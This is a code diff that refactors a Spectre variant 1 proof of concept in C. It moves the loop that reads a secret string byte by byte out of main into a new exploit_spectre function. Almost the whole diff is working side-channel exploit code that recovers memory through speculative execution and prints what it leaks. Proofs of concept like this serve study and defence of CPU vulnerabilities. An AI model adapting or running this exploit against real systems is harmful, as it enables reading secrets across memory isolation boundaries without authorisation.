@@ -132,11 +132,34 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	score[1] = results[k];
 }
 
-int main(int argc, const char **argv) {
-	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
-	int i, score[2], len = 40;
+void exploit_spectre(size_t malicious_x, int len, char *recovered_string) {
+	int i, score[2];
 	uint8_t value[2];
-	char * recovered_string;
+
+	printf("Reading %d bytes:\n", len);
+	for (i = 0; i < len; ++i) {
+		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+
+		read_memory_byte(malicious_x++, value, score);
+
+		printf("%s: ", ((score[0] >= 2 * score[1]) ? "Success" : "Unclear"));
+		printf("0x%02X = '%c' score = %d ", value[0],
+			   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		if (score[1] > 0) {
+			printf("(second best: 0x%02X = '%c' score = %d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+		}
+		printf("\n");
+
+		recovered_string[i] = ((value[0] > 31 && value[0] < 127) ? value[0] : '?');
+	}
+}
+
+int main(int argc, const char **argv) {
+	/* default for malicious_x */
+	size_t malicious_x = (size_t)(secret - (char *)array1);
+
+	int i, len = 40;
+	char *recovered_string;
 
 	for (i = 0; i < sizeof(array2); i++) {
 		/* write to array2 so in RAM not copy-on-write zero pages */
@@ -155,22 +178,8 @@ int main(int argc, const char **argv) {
 
 	printf("array1 = %p secret = %p\n", array1, secret);
 
-	printf("Reading %d bytes:\n", len);
-	for (i = 0; i < len; i++) {
-		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-
-		read_memory_byte(malicious_x++, value, score);
-
-		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-		printf("0x%02X = ’%c’ score = %d ", value[0],
-			   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-		if (score[1] > 0) {
-			printf("(second best: 0x%02X score = %d)", value[1], score[1]);
-		}
-		printf("\n");
-
-		recovered_string[i] = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
-	}
+	/* execute Spectre exploit */
+	exploit_spectre(malicious_x, len, recovered_string);
 
 	printf("String: '" BOLD "%s" RESET "'\n", recovered_string);
 	printf("temp = 0x%02x\n", temp);
